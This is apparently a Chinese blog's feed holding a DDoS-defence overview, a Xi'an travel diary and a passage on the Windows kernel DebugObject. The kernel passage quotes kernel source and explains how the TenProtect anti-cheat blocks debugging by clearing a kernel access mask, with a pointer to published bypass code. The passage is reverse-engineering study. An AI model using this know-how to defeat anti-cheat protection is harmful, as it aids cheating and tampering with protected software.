<h3 id="Zero-day_DDoS_attacks">Zero-day DDoS attacks</h3><p>除了上面这些常见的攻击之外，还存在所谓的Zero-day DDoS attacks，黑客们利用未知的或则未修复的软件漏洞、不常见的攻击向量等完成攻击，因此这种攻击更难检测和防御。例如2016年，攻击者利用Lightweight Directory Access协议(LDAP) 发起了放大系数高达55倍的攻击。<br>下面我们谈谈如何检测DDoS攻击</p>
<h2 id="0x02_检测DDoS攻击">0x02 检测DDoS攻击</h2><p>虽然无法完全阻止DDoS攻击，但是有一些有效的做法可以帮助您检测并阻止已经在进行的DDoS攻击。</p>
<ul>
<li><p>异常检测：基于统计的模型和机器学习算法（如神经网络、决策树、邻近算法）可以用来分析网络流量，将网络流量区分为正常流量和DDoS攻击。同时你也可以通过其他网络性能因素，如CPU使用率/带宽使用等情况发现异常。</p>
</li>
<li><p>Knowledge-based方法：使用signature analysis，state transition analysis，expert systems，description scripts及 self-organizing maps方法，可以通过将流量与已知攻击的特定模式进行比较来检测DDoS。</p>
</li>
<li><p>访问控制和防火墙规则：除了入口/出口流量过滤之外，访问控制列表（ACL）和防火墙规则可用于增强网络流量的可观察性。特别是，您可以分析ACL日志了解哪些流量通过了你的网络设备。您还可以配置Web应用程序防火墙，以根据特定的规则，签名和模式阻止可疑的流量。</p>
</li>
<li><p>入侵检测和报警系统：入侵防御系统（IPS）和入侵检测系统（IDS）也提高的流量的可观察性。尽管误报率很高，但是IPS和IDS警报可以作为异常和潜在恶意流量的早期指示。</p>
</li>
</ul>
<p>尽早检测到正在进行的攻击可以帮助您减轻其后果。这样，你就可以采取适当的预防措施来防御DDoS攻击，使攻击者很难完全使你的服务器宕机。使用有效的反DDoS解决方案是这些措施之一。</p>
<h2 id="0x03_如何实现一个有效的DDoS对抗方案">0x03 如何实现一个有效的DDoS对抗方案</h2><p>无论您是要创建自己的反DDoS解决方案，还是要为Web应用程序寻求商业化的DDoS攻击防护系统，请牢记下面几点要求：</p>
<ul>
<li>混合DDoS检测方法:基于签名和基于异常的检测方法的组合是检测不同类型的DDoS攻击的关键。</li>
<li>防御网络栈中第3-4层及6-7层的攻击：如果你的防御方案可以检测并缓解所有三种主要的DDoS攻击，则是比较有效的：volumetric, application及protocol。</li>
<li>有效的流量过滤：DDoS保护的最大难题之一是如何有效区分恶意请求和合法请求。很难创建有效的过滤规则，因为DDoS攻击所涉及的大多数请求看起来都是来自合法用户。如速率限制之类的流行方法通常会产生很多误报，影响合法用户访问你的服务和应用程序。</li>
<li>SIEM集成:最重要的是您的反DDoS方案必须与SIEM系统很好地集成在一起，以便您可以收集有关攻击的信息，进行分析，然后使用它来改善DDoS防护方案，防止以后的同类攻击。<br>如果满足这些要求对您来说挑战太大，请考虑向专家寻求帮助。您需要一支经验丰富的开发人员团队，对网络安全，云服务和Web应用程序有深刻的了解，才能构建高质量的反DDoS解决方案。像这样的团队可能很难在内部组建团队，但是您始终可以寻求诸如Apriorit之类​​的第三方寻求帮助。<h3 id="阻止DDoS攻击">阻止DDoS攻击</h3><div align="center"><br><img src="/img/DDoS-img-quote-2.jpg" alt align="center"><br></div><br>即使您无法阻止DDoS攻击的发生，但也有能力使攻击者很难使你的应用或则服务宕机。这就是DDoS预防技术开始起作用的地方。您可以使用两种DDoS预防机制：常规防护机制和过滤技术。<br><strong>常规防护机制</strong>是一些常见的措施，可以帮助你的服务或则应用在面对DDoS攻击时更具灵活性，防护机制包括：</li>
<li>使用防火墙：尽管防火墙无法保护您的应用或服务器免受复杂的DDoS攻击，但它们仍可以有效地处理简单的攻击。</li>
<li>经常更新安全补丁：大多数攻击都针对特定的软件或硬件漏洞，因此，及时部署所有补丁程序可以帮助您降低遭受攻击的风险。</li>
<li>关闭不必要的服务：黑客能攻击到的应用和服务越少越好。确保禁用所有不需要和未使用的服务和应用，以提高网络的安全性。<br><strong>过滤技术</strong>使用不同的方法来过滤流量并阻止潜在的危险请求。这些技术包括入口/出口过滤，基于历史的IP过滤和基于路由器的数据包过滤。</li>
</ul>
<h2 id="0x04_保护Web应用免受DDoS攻击的最佳实践">0x04 保护Web应用免受DDoS攻击的最佳实践</h2><p>除了特定的DDoS预防机制之外，还有几种实践可以帮助您确保对Web应用程序的附加DDoS保护：</p>
<ul>
<li>减少可能被攻击脆弱点个数：除非确实需要，否则不要公开您的应用和资源。这样，您可以减少攻击者可能针对的基础架构中的薄弱环节攻击的风险。您还可以禁止直接访问数据库服务器及基础架构的其他关键资源的操作。</li>
<li>增加负载：考虑使用负载平衡器和CDN，通过均衡资源负载来减轻攻击的影响，以便即使在攻击过程中也可以保持服务可用状态。</li>
<li>选择靠谱的云服务提供商：寻找具有DDoS缓解策略的可信赖的云服务提供商。确保他们的策略可确保检测和缓解基于protocol，基于Volume和基于application的攻击。例如，一些云提供商使用anycasting网络在具有相同IP地址的多台计算机之间分配大量请求，缓解负载。</li>
<li>使用第三方DDoS缓解服务：考虑将Web应用程序的保护委托给第三方供应商。DDoS缓解服务甚至可以在恶意的流量到达受害者的网络之前就将其清除。您可以寻找一种基于DNS的服务，该服务将恶意流量重定向，或者寻找一种基于边界网关协议的解决方案来处理持续的攻击。</li>
</ul>
<h2 id="0x05_结论">0x05 结论</h2><p>黑客不断使用和改进DDoS攻击，以干扰某些服务、商业基础设施、大企业设置公共和非盈利组织的工作。攻击的主要目的是耗尽受害者的资源并因此使其提供的服务、应用程序或则网站崩溃。<br>虽然无法完全阻止DDoS攻击的发生，但是有一些有效的DDoS攻击保护技术和方法可以增强您的基础设施抵御DDoS攻击并减轻后果。</p>
<h2 id="0x06_关于DDoS攻击的其他资料">0x06 关于DDoS攻击的其他资料</h2><p><a href="https://www.apriorit.com/dev-blog/559-ddos-protection-techniques" target="_blank" rel="external">原文Modern DDoS Protection Techniques: An Overview</a><br><a href="https://www.hi-linux.com/posts/50873.html" target="_blank" rel="external">浅谈 DDoS 攻击与防御</a><br><a href="https://zoumiaojiang.com/article/common-web-security/" target="_blank" rel="external">常见 Web 安全攻防总结</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>想象一下有人不停的给你打电话，并且你没办法通过加黑名单的方式阻止他，因为他每次都使用了不同的电话号码。你可能会关掉电话，但是这样其他人也不能联系你了，常见的分布式拒绝服务攻击就和这种情况类似。<br>早在乔布斯推出第一部IPhone之前，<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">DDos攻击</a>就已经出现了。因为DDos攻击攻击效果好、易于使用，并且很难追踪，现在依然非常受黑客喜欢。那么我们如何能够防御DDoS攻击呢？在DDOS攻击面前，你能确保为你的web服务器及应用提供高水平的防护么？在本文中我们将讨论如何防止DDoS攻击并介绍一些实践有效的DDoS保护和防御技术。<br>]]>
    
    </summary>
    
      <category term="DDoS" scheme="http://www.youngroe.com/tags/DDoS/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[西安周末游]]></title>
    <link href="http://www.youngroe.com/2018/09/18/Life/xian/"/>
    <id>http://www.youngroe.com/2018/09/18/Life/xian/</id>
    <published>2018-09-18T04:11:15.000Z</published>
    <updated>2020-02-15T07:54:24.205Z</updated>
    <content type="html"><![CDATA[<p><em>说好的一人一篇游记，3年了，妹子的这篇游记终于出炉了</em><br>自打成都到西安通高铁，周围无数同事到西安打卡，我也是心心念念好久，一直没有机会，趁这次中级会计考完，特想放松放松。周一开会时坐旁边的同事去过西安，心血来潮，跟小哥哥商量去西安可好，小哥哥痛快答应，于是开启了这次断腿的旅程。</p>
<p><div align="center"><br><img src="/img/xian_1.png" align="center"><br></div><br><a id="more"></a></p>
<p><div align="center"><br><img src="/img/xian_2.jpg" align="center"><br></div><br>9月14日下午4点和小哥哥在成都东站汇合，坐动车直达华山北，定下了离华山不远的客栈，欢心雀跃，犹如刚从笼子里放出来。虽然晚上10点才到客栈，但客栈老板依然为我们耐心讲解了爬华山的各种途径，并比较优劣。由于整个行程都是提前规划好的，所以我们必须在第二天下午三点前下山，老板便建议我们最好坐缆车北上西下，到了北峰再爬山到东峰、南峰、再到西峰，可以体验爬山乐趣的同时还能轻松观景。当时我就好想像当年爬峨眉那样全靠自己爬个一天多好，缆车多浪费钱啊，还少看了这么多风景，但碍于时间有限，还是作罢，接受了老板中肯的建议。</p>
<p><div align="center"><br><img src="/img/xian_3.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_4.png" align="center"><br></div><br>9月15日7点半走出客栈看到遍地雨水，心都凉了半截，真想回去接着睡觉！其实周一订票时就看到天气预报说下雨，但我想的是天气预报肯定不准，我来了就会天晴，后来证明我只是想多了。。。。。。打车去北峰下坐大巴时，的士师傅告诉我们可以去买套票，就不用每次都排队，觉得说的有理，我们便买了套票，没有买保险。买票前的士师傅说今天下雨，西峰缆车可能会因为风大而停运，让我们西上北下，我们没听；买票后他说你们这个路线很好，说不定上去后还没有下雨Blablabla……虽然师傅翻脸比翻书还快，我们还是怀着不下雨的希望到了华山脚下。然而天不遂人愿，雨一直下，气氛很不融洽。披上雨衣坐上缆车到达北峰顶时，雨更大了，温度也更低了。周围全是雾，撒都看不到，躲雨时好多人已经放弃继续爬山了，小哥哥没放弃，催促我赶紧起身，不然下山搞不赢了。没有隔雨的鞋套，我的网面运动鞋好可怜。山上唯一的店铺没有鞋套，连塑料袋都没有，我埋怨一句你们怎么什么都没有，他说我这儿这么多东西，你偏要买我没有的。好吧，不理他。不知道哪儿找了两个塑料袋，穿在脚上我们就出发啦！看到了好几个华山论剑的石碑，短暂几分钟撕去雾纱的华山，雨中依然激情的喊山，一群拍抖音的小伙儿，一颗从未见过的大树。。。接着全是雾和雨，没有别的，还有一群披着雨衣坚强爬山的游客。跳过了东峰、南峰，到了西峰后才十一点半，索性听小哥哥的下山去西安吃顿肉，西峰的索道曲折蜿蜒，像是在游乐园，见到小哥哥在索道上紧张的样子，可爱极了，也原谅了他上次不陪我去坐激流勇进。华山，只能说来过。</p>
<p><div align="center"><br><img src="/img/xian_5.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_6.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_7.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_8.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_9.png" align="center"><br></div><br>下山坐动车到西安已经15:00了。西安地铁不接受微信支付买票，不接受10元以上纸币，纠结了半天，聪明的小哥哥发现支付宝上可以直接用地铁乘车码。找了家串串，是的我们到西安吃川坝子串串，食材很不新鲜，一点也不好吃，决定晚上还是吃西安当地“美食”吧。吃完午饭，准备下一站到回民街，走出地铁口便被古色古香的建筑吸引了，能从城市建设看出西安就是一座古城，拍照拍了好久。回民街特别热闹，和成都的宽窄巷子一样热闹，从这条街便可以看到西安到底有什么美食：肉夹馍、羊肉泡馍、胡辣汤。。。。。。因为整条街都在卖。本来看中了一家排长队的肉夹馍，但小哥哥硬是不让我买，走了一圈，什么没买就走了。不过幸好没买，不然不知等多久。说实话，四川人真的吃不惯西安的食物，肉夹馍感觉是肉  夹   膜，是分离的，胡辣汤好麻，其他的我也没吃了，也没有兴趣吃了。晚上六点半拖着疲惫的身体到了宾馆，不想再动了，腿已断，感觉不是自己的了，但还有大雁塔没去，休息了半个小时，冒着风雨，去了大雁塔。大雁塔感觉是公园，里面的建筑也是古色古香，屋顶全是金灿灿的灯光，一座白色的塔矗立在中间，真的很美，可惜塔被围墙围住进不去。</p>
<p><div align="center"><br><img src="/img/xian_10.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_11.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_14.jpg" width="600" height="400" align="center"><br></div><br>9月16日又比原定计划起晚了半个小时，火急火燎吃完早饭，生怕到了兵马俑就得坐车回成都了，哈哈哈。打车到火车站，再坐915就到了，很方便。火车站的城墙很美，兵马俑需要解说，听完导游的讲解，感觉兵马俑真是个浩大的工程，心生敬畏。</p>
<p><div align="center"><br><img src="/img/xian_12.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_13.png" align="center"><br></div><br>总的来说，这次旅行除了把我照成包子脸以外还是很好的，我们突破了自己，冒雨登上华山，靠意念一天走了三个景点，行程安排恰当，没有浪费时间，不仓促。期待我们的下次旅行哦，该你写了哈。。。。。。<br>                                                                                                                2018年9月18日晚<br>                                                                                                                        LU  LU</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><em>说好的一人一篇游记，3年了，妹子的这篇游记终于出炉了</em><br>自打成都到西安通高铁，周围无数同事到西安打卡，我也是心心念念好久，一直没有机会，趁这次中级会计考完，特想放松放松。周一开会时坐旁边的同事去过西安，心血来潮，跟小哥哥商量去西安可好，小哥哥痛快答应，于是开启了这次断腿的旅程。</p>
<p><div align="center"><br><img src="/img/xian_1.png" align="center"/><br></div><br>]]>
    
    </summary>
    
      <category term="生活" scheme="http://www.youngroe.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="西安" scheme="http://www.youngroe.com/tags/%E8%A5%BF%E5%AE%89/"/>
    
      <category term="Life" scheme="http://www.youngroe.com/categories/Life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows内核重拾：DebugObject]]></title>
    <link href="http://www.youngroe.com/2018/01/06/Kernel/WindowsKernel_DebugObject/"/>
    <id>http://www.youngroe.com/2018/01/06/Kernel/WindowsKernel_DebugObject/</id>
    <published>2018-01-06T04:45:15.000Z</published>
    <updated>2020-05-17T13:04:01.372Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_什么是DebugObject">0x00 什么是DebugObject</h2><p>在Windows系统中对调试的支持主要在三个模块中，分别为内核执行体（多核处理器一般为ntkrnlmp.exe,以Dbgk为前缀,主要负责注册和监听调试事件、管理调试对象等）、原生系统库ntdll.dll（DbgUi为前缀，负责将底层的调试对象封装起来）、子系统dll（kernelbase.dll）。而调试对象（DebugObject）是一个结构体，支持用户模式调试，由一系列的标志（决定对象的状态）、一个事件、一个调试事件双链表组成。<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _DEBUG_OBJECT &#123;</span><br><span class="line">    <span class="comment">// Event thats set when the EventList is populated.</span></span><br><span class="line">    KEVENT EventsPresent;</span><br><span class="line">    <span class="comment">// Mutex to protect the structure</span></span><br><span class="line">    FAST_MUTEX Mutex;</span><br><span class="line">    <span class="comment">// Queue of events waiting for debugger intervention</span></span><br><span class="line">    LIST_ENTRY EventList;</span><br><span class="line">    <span class="comment">// Flags for the object</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">&#125; DEBUG_OBJECT, *PDEBUG_OBJECT;</span><br></pre></td></tr></table></figure></p>
<h2 id="0x01_DebugObject是如何产生的">0x01 DebugObject是如何产生的</h2><p>DebugObject在内核中由NtCreateDebugObject函数产生，每次启动调试都需要调用NtCreateDebugObject产生一个DebugObject，在NtCreateDebugObject函数中会调用ObInsertObject将创建的DebugObject插入到一个句柄表中，后续再利用句柄访问这个DebugObject。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span><br><span class="line"><span class="title">NtCreateDebugObject</span> <span class="params">(</span><br><span class="line">    OUT PHANDLE DebugObjectHandle,</span><br><span class="line">    IN ACCESS_MASK DesiredAccess,</span><br><span class="line">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span><br><span class="line">    IN ULONG Flags</span><br><span class="line">    )</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    HANDLE Handle;</span><br><span class="line">    KPROCESSOR_MODE PreviousMode;</span><br><span class="line">    PDEBUG_OBJECT DebugObject;</span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get previous processor mode and probe output arguments if necessary.</span></span><br><span class="line">    <span class="comment">// Zero the handle for error paths.</span></span><br><span class="line">    PreviousMode = KeGetPreviousMode();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (PreviousMode != KernelMode) &#123;</span><br><span class="line">            ProbeForWriteHandle (DebugObjectHandle);</span><br><span class="line">        &#125;</span><br><span class="line">        *DebugObjectHandle = <span class="literal">NULL</span>;</span><br><span class="line">    &#125; except (ExSystemExceptionFilter ()) &#123; <span class="comment">// If previous mode is kernel then don't handle the exception</span></span><br><span class="line">        <span class="keyword">return</span> GetExceptionCode ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Flags &amp; ~DEBUG_KILL_ON_CLOSE) &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Create a new debug object and initialize it.</span></span><br><span class="line">    Status = ObCreateObject (PreviousMode,</span><br><span class="line">                             DbgkDebugObjectType,</span><br><span class="line">                             ObjectAttributes,</span><br><span class="line">                             PreviousMode,</span><br><span class="line">                             <span class="literal">NULL</span>,</span><br><span class="line">                             <span class="keyword">sizeof</span> (DEBUG_OBJECT),</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             &amp;DebugObject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS (Status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line">    ExInitializeFastMutex (&amp;DebugObject-&gt;Mutex);</span><br><span class="line">    InitializeListHead (&amp;DebugObject-&gt;EventList);</span><br><span class="line">    KeInitializeEvent (&amp;DebugObject-&gt;EventsPresent, NotificationEvent, FALSE);</span><br><span class="line">    <span class="keyword">if</span> (Flags &amp; DEBUG_KILL_ON_CLOSE) &#123;</span><br><span class="line">        DebugObject-&gt;Flags = DEBUG_OBJECT_KILL_ON_CLOSE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        DebugObject-&gt;Flags = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Insert the object into the handle table</span></span><br><span class="line">    Status = ObInsertObject (DebugObject,</span><br><span class="line">                             <span class="literal">NULL</span>,</span><br><span class="line">                             DesiredAccess,</span><br><span class="line">                             <span class="number">0</span>,</span><br><span class="line">                             <span class="literal">NULL</span>,</span><br><span class="line">                             &amp;Handle);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS (Status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        *DebugObjectHandle = Handle;</span><br><span class="line">    &#125; except (ExSystemExceptionFilter ()) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// The caller changed the page protection or deleted the memory for the handle.</span></span><br><span class="line">        <span class="comment">// No point closing the handle as process rundown will do that and we don't know its still the same handle</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>NtCreateDebugObject函数主要实现在ObCreateObject函数，关键参数为DbgkDebugObjectType，DbgkDebugObjectType是一个全局变量，类型为_OBJECT_TYPE。每次调试生成的DebugObject都会依赖于DbgkDebugObjectType这个全局变量，因此我们可以通过修改DbgkDebugObjectType某些标志位做一些猥琐的事情，比如说反调试，并且由于只是内核中的一个标志位很难找到不能调试的原因。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt nt!_OBJECT_TYPE</span><br><span class="line">+<span class="number">0x000</span> TypeList         : _LIST_ENTRY</span><br><span class="line">+<span class="number">0x010</span> Name             : _UNICODE_STRING</span><br><span class="line">+<span class="number">0x020</span> DefaultObject    : Ptr64 Void</span><br><span class="line">+<span class="number">0x028</span> Index            : UChar</span><br><span class="line">+<span class="number">0x02c</span> TotalNumberOfObjects : Uint4B</span><br><span class="line">+<span class="number">0x030</span> TotalNumberOfHandles : Uint4B</span><br><span class="line">+<span class="number">0x034</span> HighWaterNumberOfObjects : Uint4B</span><br><span class="line">+<span class="number">0x038</span> HighWaterNumberOfHandles : Uint4B</span><br><span class="line">+<span class="number">0x040</span> TypeInfo         : _OBJECT_TYPE_INITIALIZER</span><br><span class="line">+<span class="number">0x0b0</span> TypeLock         : _EX_PUSH_LOCK</span><br><span class="line">+<span class="number">0x0b8</span> Key              : Uint4B</span><br><span class="line">+<span class="number">0x0c0</span> CallbackList     : _LIST_ENTRY</span><br></pre></td></tr></table></figure></p>
<p>DbgkDebugObjectType初始化在DbgkInitialize函数中，也是被ObCreateObjectType创建，关键参数为一个_OBJECT_TYPE_INITIALIZER结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _OBJECT_TYPE_INITIALIZER</span><br><span class="line">ntdll!_OBJECT_TYPE_INITIALIZER</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> ObjectTypeFlags  : UChar</span><br><span class="line">   +<span class="number">0x002</span> CaseInsensitive  : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> UnnamedObjectsOnly : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> UseDefaultObject : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> SecurityRequired : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> MaintainHandleCount : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> MaintainTypeList : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> SupportsObjectCallbacks : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> ObjectTypeCode   : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> InvalidAttributes : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> GenericMapping   : _GENERIC_MAPPING</span><br><span class="line">   +<span class="number">0x01c</span> ValidAccessMask  : Uint4B</span><br><span class="line">   +<span class="number">0x020</span> RetainAccess     : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> PoolType         : _POOL_TYPE</span><br><span class="line">   +<span class="number">0x028</span> DefaultPagedPoolCharge : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> DefaultNonPagedPoolCharge : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> DumpProcedure    : Ptr64     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x038</span> OpenProcedure    : Ptr64     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x040</span> CloseProcedure   : Ptr64     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x048</span> DeleteProcedure  : Ptr64     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x050</span> ParseProcedure   : Ptr64     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x058</span> SecurityProcedure : Ptr64     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x060</span> QueryNameProcedure : Ptr64     <span class="keyword">long</span> </span><br><span class="line">   +<span class="number">0x068</span> OkayToCloseProcedure : Ptr64     <span class="keyword">unsigned</span> <span class="keyword">char</span></span><br></pre></td></tr></table></figure></p>
<div align="center"><br><img src="/img/20180116Windbg_DbgStruct.png" alt="Win7 X64下DebugObject几个关键结构体关系" align="center"><br></div>

<h2 id="0x02_DebugObject用于反调试实例">0x02 DebugObject用于反调试实例</h2><p>TenProtect反外挂开启后，调试进程会附加失败错误号为0xC0000022（不仅仅是调试游戏进程，调试任何进程都会产生这个错误），具体原因为A process has requested access to an object, but has not been granted those access rights.</p>
<p><div align="center"><br><img src="/img/20180116Windbg_failed.png" alt="TProtect附加失败错误" align="center"><br></div><br>根据网上公布的bypass的代码，可以很容易的发现TP主要是将DbgkDebugObjectType.TypeInfo.ValidAccessMask标志位清零，ValidAccessMask从名称上就可以知道是和权限相关，而原本默认为DEBUG_ALL_ACCESS(0x1F000F)，被清零后就什么权限都没有了，创建了一个毫无用处的DebugObject，并且由于DbgkDebugObjectType是全局的与特定进程无关，导致调试任意进程都会失败。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span><br><span class="line"><span class="title">NtDebugActiveProcess</span> <span class="params">(</span><br><span class="line">    IN HANDLE ProcessHandle,</span><br><span class="line">    IN HANDLE DebugObjectHandle</span><br><span class="line">    )</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    KPROCESSOR_MODE PreviousMode;</span><br><span class="line">    PDEBUG_OBJECT DebugObject;</span><br><span class="line">    PEPROCESS Process;</span><br><span class="line">    PETHREAD LastThread;</span><br><span class="line">    PAGED_CODE ();</span><br><span class="line">    PreviousMode = KeGetPreviousMode();</span><br><span class="line">    Status = ObReferenceObjectByHandle (ProcessHandle,</span><br><span class="line">                                        PROCESS_SET_PORT,</span><br><span class="line">                                        PsProcessType,</span><br><span class="line">                                        PreviousMode,</span><br><span class="line">                                        &amp;Process,</span><br><span class="line">                                        <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!NT_SUCCESS (Status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Don't let us debug ourselves or the system process.</span></span><br><span 